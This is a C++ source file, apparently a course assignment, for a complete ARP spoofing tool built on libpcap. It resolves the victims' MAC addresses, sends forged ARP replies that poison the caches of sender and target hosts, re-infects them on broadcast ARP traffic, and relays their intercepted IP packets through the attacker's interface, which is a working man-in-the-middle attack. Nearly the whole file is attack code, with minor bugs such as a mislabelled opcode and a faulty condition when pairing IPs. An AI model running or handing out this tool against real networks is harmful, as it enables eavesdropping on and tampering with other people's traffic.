#include <iostream>
#include <string>
#include <pcap.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <set>
#include <map>
#include <iomanip>
#include <chrono>
#include <ctime>
#include <vector>
#include <thread>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"
#include <time.h>

void printTimestamp(const std::string& message) {
    auto now = std::chrono::system_clock::now();
    std::time_t now_time = std::chrono::system_clock::to_time_t(now);
    auto now_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;

    std::cout << "[" << std::put_time(std::localtime(&now_time), "%Y-%m-%d %H:%M:%S")
              << '.' << std::setw(3) << std::setfill('0') << now_ms.count() << "] "
              << message << std::endl;
}
#pragma pack(push, 1)
struct IpHdr {
    u_char ip_vhl;        
    u_char ip_tos;        
    u_short ip_len;       
    u_short ip_id;        
    u_short ip_off;       
    u_char ip_ttl;        
    u_char ip_p;          
    u_short ip_sum;       
    struct in_addr ip_src, ip_dst;

    static u_short calculateChecksum(u_short* buffer, int size) {
        u_long cksum = 0;
        while (size > 1) {
            cksum += *buffer++;
            size -= sizeof(u_short);
        }
        if (size) {
            cksum += *(u_char*)buffer;
        }
        cksum = (cksum >> 16) + (cksum & 0xffff);
        cksum += (cksum >> 16);
        return (u_short)(~cksum);
    }
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthIpPacket final {
    EthHdr eth_;
    IpHdr ip_;
};
#pragma pack(pop)

struct Sender {
    Ip s_ip;
    Mac s_mac;
    bool operator<(const Sender& other) const {
        if (s_ip < other.s_ip)
            return true;
        if (s_ip == other.s_ip)
            return s_mac < other.s_mac;
        return false;
    }
};

struct Target {
    Ip t_ip;
    Mac t_mac;
};

struct Attacker {
    Ip a_ip;
    Mac a_mac;
};

void usage() {
    printf("syntax: arp-spoofing <interface> SenderIP1 TargetIP1 SenderIP2 TargetIP2...\n");
    printf("sample: arp-spoofing wlan0 192.168.0.1 192.168.0.2 192.168.0.3 192.168.0.4\n");
}

Attacker* get_AttackerIPandMac(const char* ifname) {
    printf("------------------- Get Attacker Ip and Mac -------------------\n");
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (fd < 0) {
        perror("Failed to create socket");
        return nullptr;
    }
    Attacker* attacker = new Attacker;
    strcpy(s.ifr_name, ifname);
    if (ioctl(fd, SIOCGIFHWADDR, &s) == 0) {
        unsigned char* mac = (unsigned char*)s.ifr_hwaddr.sa_data;
        attacker->a_mac = Mac(mac);
        printf("[DEBUG] Attacker MAC: %s\n", std::string(attacker->a_mac).c_str());
    } else {
        perror("Failed to get MAC address");
        close(fd);
        delete attacker;
        return nullptr;
    }

    if (ioctl(fd, SIOCGIFADDR, &s) == 0) {
        struct sockaddr_in* ipaddr = (struct sockaddr_in*)&s.ifr_addr;
        attacker->a_ip = htonl((ipaddr->sin_addr.s_addr));
        printf("[DEBUG] Attacker IP: %s\n", std::string(attacker->a_ip).c_str());
    } else {
        perror("Failed to get IP address");
        close(fd);
        delete attacker;
        return nullptr;
    }
    printf("\n\n");
    close(fd);
    return attacker;
}

Mac MacRequest(Mac a_mac, Ip a_ip, Ip s_ip, pcap_t* handle) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = a_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(a_mac);
    packet.arp_.sip_ = htonl(a_ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(s_ip);
    printf("---------------------------MacRequest--------------------------\n");
    printf("[DEBUG] Find Mac Address : %s\n", std::string(s_ip).c_str(), std::string(s_ip).c_str(), std::string(s_ip).c_str());
    clock_t start = clock();
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* listen_packet;

        int res = pcap_next_ex(handle, &header, &listen_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        struct EthHdr* e_packet = (struct EthHdr*)listen_packet;
        struct ArpHdr* a_packet = (struct ArpHdr*)(listen_packet + sizeof(EthHdr));

        if (e_packet->type() == EthHdr::Arp && a_packet->op() == ArpHdr::Reply && a_packet->sip() == s_ip) {
            printf("[DEBUG] MacRequest Received Packet | Sender MAC: %s, Sender IP: %s\n", std::string(Mac(a_packet->smac())).c_str(), std::string(a_packet->sip()).c_str());
            return Mac(a_packet->smac());
        } else{
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
    }
    return Mac::nullMac();
}
void ArpSpoofingFlow(const u_char* listen_packet, Mac attacker_mac, Mac target_mac, pcap_t* handle, pcap_pkthdr * header) {
    EthIpPacket *packet = (EthIpPacket *)listen_packet;
	packet->eth_.smac_ = attacker_mac;
	packet->eth_.dmac_ = target_mac;
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(listen_packet), header->len);
}


void ArpInfect(Mac a_mac, Ip a_ip, Mac s_mac, Ip s_ip, Ip t_ip, pcap_t* handle){
    printf("---------------ArpInfect Sending ARP request-------------------\n");
    EthArpPacket packet;
    packet.eth_.dmac_ = s_mac;
    packet.eth_.smac_ = a_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = a_mac;
    packet.arp_.sip_ = htonl(t_ip);
    packet.arp_.tmac_ = s_mac;
    packet.arp_.tip_ = htonl(s_ip);

    printf("[DEBUG] ArpInfect Sending ARP request | Sender MAC: %s, Sender IP: %s, Target IP: %s\n",
        std::string(a_mac).c_str(), std::string(t_ip).c_str(), std::string(s_ip).c_str());

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
void ArpReply(Mac a_mac, Ip t_ip, Mac s_mac, Ip s_ip, pcap_t* handle) {
    EthArpPacket packet;
    packet.eth_.dmac_ = s_mac;
    packet.eth_.smac_ = a_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(a_mac);
    packet.arp_.sip_ = htonl(t_ip);
    packet.arp_.tmac_ = s_mac;
    packet.arp_.tip_ = htonl(s_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
void handleArpSpoofing(Attacker* attacker, Sender sender, Target target, pcap_t* handle) {
    ArpInfect(attacker->a_mac, attacker->a_ip, sender.s_mac, sender.s_ip, target.t_ip, handle);
    ArpInfect(attacker->a_mac, attacker->a_ip, target.t_mac, target.t_ip, sender.s_ip, handle);

    while (true) {
        if (handle == nullptr) {
            fprintf(stderr, "Couldn't open device\n");
            continue;
        }
        struct pcap_pkthdr* header;
        const u_char* listen_packet;

        int res = pcap_next_ex(handle, &header, &listen_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        struct EthHdr* e_packet = (struct EthHdr*)listen_packet;
        bool isBroadcast = (e_packet->dmac_ == Mac::broadcastMac());

        if(isBroadcast && e_packet->type()==EthHdr::Arp){
            printTimestamp("[DEBUG] Again ArpInfect Sending ARP request");
            ArpInfect(attacker->a_mac, attacker->a_ip, sender.s_mac, sender.s_ip, target.t_ip, handle);
            ArpInfect(attacker->a_mac, attacker->a_ip, target.t_mac, target.t_ip, sender.s_ip, handle);
        } else if (!isBroadcast && e_packet->type()==EthHdr::Arp&&e_packet->dmac()==attacker->a_mac){
            ArpInfect(attacker->a_mac, attacker->a_ip, sender.s_mac, sender.s_ip, target.t_ip, handle);
            ArpInfect(attacker->a_mac, attacker->a_ip, target.t_mac, target.t_ip, sender.s_ip, handle);
        } else if (!isBroadcast &&e_packet->smac() == sender.s_mac){
            printTimestamp("[DEBUG] Sender -> Target : ArpSpoofingFlow");
            ArpSpoofingFlow(listen_packet, attacker->a_mac, target.t_mac,handle, header); 
        } else if (!isBroadcast &&e_packet->smac() == target.t_mac){
            printTimestamp("[DEBUG] Target -> Sender : ArpSpoofingFlow");
            ArpSpoofingFlow(listen_packet, attacker->a_mac, sender.s_mac,handle, header); 
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc % 2 != 0) {
        usage();
        return -1;
    }
    char errbuf[PCAP_ERRBUF_SIZE];

    Attacker* attacker = get_AttackerIPandMac(argv[1]);
    if (!attacker) {
        fprintf(stderr, "Failed to get attacker's IP and MAC address\n");
        return -1;
    }

    pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "can not open device %s: %s\n", argv[1], errbuf);
        return -1;
    }

    std::set<Ip> Ips;
    for(int i = 2; i < argc; i++){
        Ips.insert(Ip(argv[i]));
    }
    std::map<Ip, Mac> IPs_Macs;
    for(const auto& ip: Ips){
        IPs_Macs.insert({ip, MacRequest(attacker->a_mac, attacker->a_ip, ip, handle)});
    }

    std::multimap<Sender, Target> mmap;
    Sender sender;
    Target target;
    for (int i = 1; i < argc / 2; i++) {
        auto s_it = IPs_Macs.find(Ip(argv[i * 2]));
        auto t_it = IPs_Macs.find(Ip(argv[i * 2 + 1]));

        if (s_it != IPs_Macs.end() || t_it != IPs_Macs.end()) {
            sender = { s_it->first, s_it->second };
            target = { t_it->first, t_it->second };
            mmap.insert({sender, target});
            //printf("[DEBUG] Mapped Sender IP: %s -> Target IP: %s\n", std::string(s_it->first).c_str(), std::string(t_it->first).c_str());
        } else {
            printf("ERROR: Could not map Sender IP %s to Target IP %s\n", argv[i * 2], argv[i * 2 + 1]);
        }
    }
    printf("\n\n");

    std::vector<std::thread> threads;
    for (const auto& pair : mmap) {
        pcap_t* handle_spoof = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
        sender = pair.first;
        target = pair.second;
        threads.emplace_back(handleArpSpoofing, attacker, sender, target, handle_spoof);
    }

    for (auto& th : threads) {
        th.join();
    }

    pcap_close(handle);
    delete attacker;
    return 0;
}
